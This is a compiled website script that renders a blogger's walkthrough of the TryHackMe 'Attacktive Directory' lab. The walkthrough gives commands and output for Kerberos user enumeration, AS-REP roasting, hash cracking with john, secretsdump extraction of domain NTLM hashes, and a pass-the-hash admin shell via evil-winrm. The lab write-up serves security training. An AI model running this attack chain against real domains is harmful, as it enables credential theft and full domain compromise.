"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[91803],{28453:(e,t,n)=>{n.d(t,{R:()=>i,x:()=>c});var a=n(96540);const s={},r=a.createContext(s);function i(e){const t=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),a.createElement(r.Provider,{value:t},e.children)}},98507:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>c,default:()=>h,frontMatter:()=>i,metadata:()=>a,toc:()=>d});const a=JSON.parse('{"id":"hacker/tryhackme/attacktive","title":"TryHackMe Attacktive Directory Walkthrough - Active Directory Exploitation Guide","description":"Complete walkthrough of TryHackMe\'s Attacktive Directory room. Learn Active Directory attacks, Kerberos exploitation, and Windows domain security assessment.","source":"@site/docs/hacker/tryhackme/attacktive.md","sourceDirName":"hacker/tryhackme","slug":"/hacker/tryhackme/attacktive","permalink":"/docs/hacker/tryhackme/attacktive","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/attacktive.md","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/tags/tryhackme"},{"inline":true,"label":"active-directory","permalink":"/docs/tags/active-directory"},{"inline":true,"label":"kerberos","permalink":"/docs/tags/kerberos"},{"inline":true,"label":"domain-attacks","permalink":"/docs/tags/domain-attacks"},{"inline":true,"label":"windows","permalink":"/docs/tags/windows"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1771617957000,"sidebarPosition":8,"frontMatter":{"title":"TryHackMe Attacktive Directory Walkthrough - Active Directory Exploitation Guide","description":"Complete walkthrough of TryHackMe\'s Attacktive Directory room. Learn Active Directory attacks, Kerberos exploitation, and Windows domain security assessment.","keywords":["tryhackme attacktive directory","active directory attacks","kerberos exploitation","domain attacks","windows security","ad exploitation"],"tags":["tryhackme","active-directory","kerberos","domain-attacks","windows"],"sidebar_position":8},"sidebar":"docsSidebar","previous":{"title":"TryHackMe Corp Walkthrough - Corporate Network Penetration Testing","permalink":"/docs/hacker/tryhackme/corp"},"next":{"title":"Holo Live","permalink":"/docs/hacker/tryhackme/hololive"}}');var s=n(74848),r=n(28453);const i={title:"TryHackMe Attacktive Directory Walkthrough - Active Directory Exploitation Guide",description:"Complete walkthrough of TryHackMe's Attacktive Directory room. Learn Active Directory attacks, Kerberos exploitation, and Windows domain security assessment.",keywords:["tryhackme attacktive directory","active directory attacks","kerberos exploitation","domain attacks","windows security","ad exploitation"],tags:["tryhackme","active-directory","kerberos","domain-attacks","windows"],sidebar_position:8},c=void 0,o={},d=[{value:"RECON",id:"recon",level:2},{value:"Scan",id:"scan",level:3},{value:"Enumerate",id:"enumerate",level:3},{value:"CRACK",id:"crack",level:2},{value:"john the ripper",id:"john-the-ripper",level:3},{value:"ACCESS",id:"access",level:2},{value:"smbclient",id:"smbclient",level:3},{value:"impacket scripts",id:"impacket-scripts",level:3},{value:"evil-winrm",id:"evil-winrm",level:3}];function l(e){const t={a:"a",admonition:"admonition",code:"code",em:"em",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(t.admonition,{title:"Description",type:"info",children:[(0,s.jsxs)(t.p,{children:["These are my notes for the ",(0,s.jsx)(t.a,{href:"https://tryhackme.com/room/attacktivedirectory",children:'"Attacktive Directory"'})," Room on TryHackMe. This was a walk-through styled room so all the instructions were there, these are just my notes."]}),(0,s.jsx)(t.p,{children:"Credits: S/o to hunterbot for the assist, and Doxum and Noodles for hanging out no the stream :)"}),(0,s.jsxs)(t.table,{children:[(0,s.jsx)(t.thead,{children:(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.th,{style:{textAlign:"center"},children:"OS"}),(0,s.jsx)(t.th,{style:{textAlign:"center"},children:"Level"}),(0,s.jsx)(t.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,s.jsx)(t.tbody,{children:(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{style:{textAlign:"center"},children:"Windows"}),(0,s.jsx)(t.td,{style:{textAlign:"center"},children:"Medium"}),(0,s.jsx)(t.td,{style:{textAlign:"center"},children:"3/5"})]})})]})]}),"\n",(0,s.jsx)(t.p,{children:"The room says we need to install the following:"}),"\n",(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsx)(t.li,{children:"bloodhound & neo4j"}),"\n",(0,s.jsx)(t.li,{children:"impacket"}),"\n",(0,s.jsx)(t.li,{children:(0,s.jsx)(t.a,{href:"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64",children:"kerbrute"})}),"\n"]}),"\n",(0,s.jsx)(t.h2,{id:"recon",children:"RECON"}),"\n",(0,s.jsx)(t.h3,{id:"scan",children:"Scan"}),"\n",(0,s.jsx)(t.p,{children:"No network scanning this time, we know its Active Directory so straight to enumeration."}),"\n",(0,s.jsx)(t.h3,{id:"enumerate",children:"Enumerate"}),"\n",(0,s.jsxs)(t.p,{children:["smb enumeration: ",(0,s.jsx)(t.code,{children:"enum4linux -U -M 10.10.75.101"})]}),"\n",(0,s.jsxs)(t.p,{children:["install kerbrute, download the THM provided ",(0,s.jsx)(t.code,{children:"userlist.txt"})," and ",(0,s.jsx)(t.code,{children:"passwordlist.txt"}),":"]}),"\n",(0,s.jsxs)(t.p,{children:["run: ",(0,s.jsx)(t.code,{children:"kerbrute userenum --dc $AD_IP -d THM-AD userlist.txt"})," to check which usernames in our list are VALID"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"\u2514\u2500$ kerbrute userenum --dc 10.10.75.101 -d THM-AD userlist.txt                                              1 \u2a2f 1 \u2699\n\n    __             __               __\n   / /_____  _____/ /_  _______  __/ /____\n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/\n\nVersion: v1.0.3 (9dad6e1) - 03/15/22 - Ronnie Flathers @ropnop\n\n2022/03/15 21:43:16 >  Using KDC(s):\n2022/03/15 21:43:16 >   10.10.75.101:88\n\n2022/03/15 21:43:17 >  [+] VALID USERNAME:       james@THM-AD\n2022/03/15 21:43:22 >  [+] VALID USERNAME:       svc-admin@THM-AD\n2022/03/15 21:43:28 >  [+] VALID USERNAME:       James@THM-AD\n2022/03/15 21:43:30 >  [+] VALID USERNAME:       robin@THM-AD\n2022/03/15 21:43:55 >  [+] VALID USERNAME:       darkstar@THM-AD\n2022/03/15 21:44:09 >  [+] VALID USERNAME:       administrator@THM-AD\n2022/03/15 21:44:39 >  [+] VALID USERNAME:       backup@THM-AD\n2022/03/15 21:44:53 >  [+] VALID USERNAME:       paradox@THM-AD\n2022/03/15 21:46:21 >  [+] VALID USERNAME:       JAMES@THM-AD\n2022/03/15 21:46:52 >  [+] VALID USERNAME:       Robin@THM-AD\n2022/03/15 21:49:51 >  [+] VALID USERNAME:       Administrator@THM-AD\n2022/03/15 21:55:51 >  [+] VALID USERNAME:       Darkstar@THM-AD\n"})}),"\n",(0,s.jsxs)(t.p,{children:["With this list of valid usernames, we want to find which users have the ",(0,s.jsx)(t.code,{children:"UF_DONT_REQUIRE_PREAUTH"})," flag set."]}),"\n",(0,s.jsxs)(t.admonition,{title:"UF_DONT_REQUIRE_PREAUTH?",type:"info",children:[(0,s.jsx)(t.p,{children:"Why we want to find users with this flag set:"}),(0,s.jsx)(t.p,{children:(0,s.jsx)(t.em,{children:'"...there is a vulnerable option available for Kerberos users: \u2018Do not require Kerberos preauthentication\u2019 (UF_DONT_REQUIRE_PREAUTH). When pre-authentication is enabled, a time stamp is encrypted using the user\u2019s password hash as an encryption key. If the KDC reads a valid time while using the user\u2019s hash to decrypt the time stamp, the KDC knows that the request isn\u2019t a replay of the previous request.'})}),(0,s.jsx)(t.p,{children:(0,s.jsx)(t.em,{children:'If pre-authentication is disabled, an attacker can send a request for authentication. The KDC will return an encrypted TGT from which an attacker can retrieve the vulnerable user\u2019s hash and crack it offline. The hash is in krb5asrep format."'})}),(0,s.jsxs)(t.p,{children:["credits: ",(0,s.jsx)(t.a,{href:"https://foxed.github.io/GetNPUsers/",children:"Alex Fox"})]})]}),"\n",(0,s.jsxs)(t.p,{children:["Let's use ",(0,s.jsx)(t.code,{children:"impacket-GetNPUsers"})," (from your terminal with ",(0,s.jsx)(t.code,{children:"impacket"})," installed):"]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.code,{children:"impacket-GetNPUsers -outputfile $OUTPUT_FILE -usersfile $INPUT_FILE -debug -dc-ip $AD_IP $DOMAIN/"})}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"$ impacket-GetNPUsers -outputfile kerb-user.txt -usersfile user-1.txt -debug -dc-ip 10.10.75.101 thm-ad/\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\n[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.9/site-packages/impacket\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User james@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User James@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User robin@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User darkstar@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User administrator@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User backup@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User paradox@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User JAMES@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User Robin@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User Administrator@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n[+] Trying to connect to KDC at 10.10.75.101\n[-] User Darkstar@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set\n"})}),"\n",(0,s.jsxs)(t.p,{children:["let that run and check ",(0,s.jsx)(t.code,{children:"$OUTPUT_FILE"})," for any successful usernames:"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"$ cat kerb-user.txt\n$krb5asrep$23$svc-admin@THM-AD@THM-AD:58f9aec0401e1853c840af5f369ac610$8efe1b2bb5373788a670aaa6ff41aead7359c0d5530ee970a34a22e54411d646d9bccc30d67efbe06e0774d9b8caf6a227ea8716307d006d937d0dc2bb449558292096b6fa84cedad7201bfc2c3ebe43e1ebf1fb0e1124dbe8089aadd8739683a3e638690eddc4667381457d34537cb5a6093d1f08d3bc04faafc57434d0105d4c00c0c6084af6f88a65a9e0159ae26ff036793bb9501d29003231f68089b4706c9efff58f366cafae0c6b4e08443fe36d9c9e858c6276c263ac76e8dc51bc856887433f33203aaf40053c19a4fecb42b7987a4036dbff228b370f70d3e5acd8c0047f6942a673a5e5\n"})}),"\n",(0,s.jsx)(t.admonition,{title:"ASREPRoast TIP",type:"tip",children:(0,s.jsxs)(t.p,{children:["If you use the latest version of kerbrute it can do ",(0,s.jsx)(t.code,{children:"ASREPRoast"})," at the same time as evaluating valid usernames."]})}),"\n",(0,s.jsx)(t.h2,{id:"crack",children:"CRACK"}),"\n",(0,s.jsxs)(t.p,{children:["Use ",(0,s.jsx)(t.code,{children:"hashid -jm <hash />"})," to lookup hash type."]}),"\n",(0,s.jsx)(t.admonition,{title:"Hashcat TIP",type:"tip",children:(0,s.jsx)(t.p,{children:(0,s.jsxs)(t.em,{children:["Lookup hashchat ",(0,s.jsx)(t.a,{href:"https://hashcat.net/wiki/doku.php?id=example_hashes",children:"examples"})," for all things hash."]})})}),"\n",(0,s.jsx)(t.p,{children:"Details about our hash:"}),"\n",(0,s.jsxs)(t.table,{children:[(0,s.jsx)(t.thead,{children:(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.th,{style:{textAlign:"left"},children:"Hash-Mode"}),(0,s.jsx)(t.th,{style:{textAlign:"left"},children:"Hash-Name"}),(0,s.jsx)(t.th,{style:{textAlign:"left"},children:"Hash"})]})}),(0,s.jsx)(t.tbody,{children:(0,s.jsxs)(t.tr,{children:[(0,s.jsx)(t.td,{style:{textAlign:"left"},children:"18200"}),(0,s.jsx)(t.td,{style:{textAlign:"left"},children:"Kerberos 5, etype 23, AS-REP"}),(0,s.jsx)(t.td,{style:{textAlign:"left"},children:(0,s.jsx)(t.code,{children:"$krb5asrep$23$user@domain.com:3e156a..."})})]})})]}),"\n",(0,s.jsxs)(t.p,{children:["hash-mode = ",(0,s.jsx)(t.code,{children:"18200"})]}),"\n",(0,s.jsx)(t.h3,{id:"john-the-ripper",children:"john the ripper"}),"\n",(0,s.jsxs)(t.p,{children:["Let's crack it with ",(0,s.jsx)(t.code,{children:"john"}),": ",(0,s.jsx)(t.code,{children:"john --wordlist=$WORDLIST $HASH_FILE"})]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"\u2500$ john --wordlist=./passwordlist.txt kerb-user.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmanagement2005   ($krb5asrep$23$svc-admin@THM-AD@THM-AD)\n1g 0:00:00:01 DONE (2022-03-15 22:22) 0.9433g/s 6279p/s 6279c/s 6279C/s shearer..amy123\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/RxHack/THM/OFFENSIVEPENTESTPATH/ATTACKTIVE]\n\u2514\u2500$ john --show kerb-user.txt\n$krb5asrep$23$svc-admin@THM-AD@THM-AD:management2005\n\n1 password hash cracked, 0 left\n"})}),"\n",(0,s.jsx)(t.admonition,{title:"0reoByte TIP",type:"tip",children:(0,s.jsx)(t.p,{children:(0,s.jsx)(t.em,{children:'"if you want to look back at a hash cracked by john without the john command you could check the pots file in the .john directory in your home dir (0reoByte)"'})})}),"\n",(0,s.jsx)(t.h2,{id:"access",children:"ACCESS"}),"\n",(0,s.jsx)(t.p,{children:"Now that we have a valid username and password we cracked, we enumerate again with the credentials and see what we can get"}),"\n",(0,s.jsx)(t.h3,{id:"smbclient",children:"smbclient"}),"\n",(0,s.jsxs)(t.p,{children:["Let's use ",(0,s.jsx)(t.code,{children:"smbclient"})," to access the ",(0,s.jsx)(t.code,{children:"backup"})," share we found from before:"]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.code,{children:"$ smbclient -L //$AD_IP/$SHARE -U $username -P $password"})}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'\u2514\u2500$ smbclient //10.10.81.46/backup -U svc-admin\nEnter WORKGROUP\\svc-admin\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Sun Apr  5 07:08:39 2020\n  ..                                  D        0  Sun Apr  5 07:08:39 2020\n  backup_credentials.txt              A       48  Sun Apr  5 07:08:53 2020\n\n                8247551 blocks of size 4096. 3578209 blocks available\nsmb: \\>\n'})}),"\n",(0,s.jsxs)(t.p,{children:["Download and decode the credentials found in ",(0,s.jsx)(t.code,{children:"backup_credentials.txt"}),":"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"$ echo YmFja3VwQHNwb*************XAyNTE2ODYw | base64 -d\nbackup@*********.local:*************\n"})}),"\n",(0,s.jsx)(t.h3,{id:"impacket-scripts",children:"impacket scripts"}),"\n",(0,s.jsxs)(t.p,{children:["Use ",(0,s.jsx)(t.code,{children:"impacket-secretsdump"})," to dump all secrets from the AD via the valid backup credentials you just found:"]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.code,{children:"$ impacket-secretsdump -just-dc-user $username $domain/$username:$password@$AD_IP"})}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsxs)(t.em,{children:["note: ",(0,s.jsx)(t.code,{children:"$username"})," and ",(0,s.jsx)(t.code,{children:"$domain"})," here are the ones from the credentials file we decrypted."]})}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"\u2514\u2500$ impacket-secretsdump -just-dc-user backup *********.local/backup:************* @10.10.81.46\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nspookysec.local\\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::\n[*] Kerberos keys grabbed\nspookysec.local\\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922\nspookysec.local\\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197\nspookysec.local\\backup:des-cbc-md5:d601e9469b2f6d89\n[*] Cleaning up...\n"})}),"\n",(0,s.jsxs)(t.p,{children:["That was using the ",(0,s.jsx)(t.code,{children:"-just-dc-user"})," switch."]}),"\n",(0,s.jsxs)(t.p,{children:["Using ",(0,s.jsx)(t.code,{children:"-just-dc-ntlm"})," gets much better results:"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"\u2500$ impacket-secretsdump -just-dc-ntlm *********.local/backup:************* @10.10.81.46\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:********************************:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::\nspookysec.local\\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::\nspookysec.local\\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::\nspookysec.local\\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::\nspookysec.local\\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::\nspookysec.local\\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::\nspookysec.local\\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::\nspookysec.local\\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::\nspookysec.local\\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::\nspookysec.local\\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::\nspookysec.local\\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::\nspookysec.local\\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::\nspookysec.local\\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::\nspookysec.local\\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::\nspookysec.local\\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:********************************:::\nATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:5d1d45d31626d9cc165f2dbae119d4d3:::\n[*] Cleaning up...\n"})}),"\n",(0,s.jsxs)(t.p,{children:["Admin 32bit hash = ",(0,s.jsx)(t.code,{children:"********************************"})]}),"\n",(0,s.jsx)(t.h3,{id:"evil-winrm",children:"evil-winrm"}),"\n",(0,s.jsxs)(t.p,{children:["Now we use ",(0,s.jsx)(t.a,{href:"https://github.com/Hackplayers/evil-winrm",children:"evil-winrm"}),' aka the "Windows Remote Management" shell, to get an Admin-level shell on the AD box:']}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.code,{children:"$ evil-winrm -u $ADMIN_USERNAME -H $ADMIN_HASH -i $AD_IP"})}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"\u2514\u2500$ evil-winrm -u Administrator -H ******************************** -i 10.10.81.46\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>\n"})}),"\n",(0,s.jsx)(t.p,{children:"We have an Admin shell."}),"\n",(0,s.jsx)(t.p,{children:"Find the 3 x flags."}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..\n*Evil-WinRM* PS C:\\Users\\Administrator> cd Desktop\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> dir\n\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----         4/4/2020  11:39 AM             32 root.txt\n\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> type root.txt\nTryHackMe{*********************}\n\nEvil-WinRM* PS C:\\Users> type backup\\Desktop\\PrivEsc.txt\nTryHackMe{***************}\n\n*Evil-WinRM* PS C:\\Users> type svc-admin\\Desktop\\user.txt.txt\nTryHackMe{*****************}\n"})}),"\n",(0,s.jsx)(t.p,{children:"Game over."})]})}function h(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}}}]);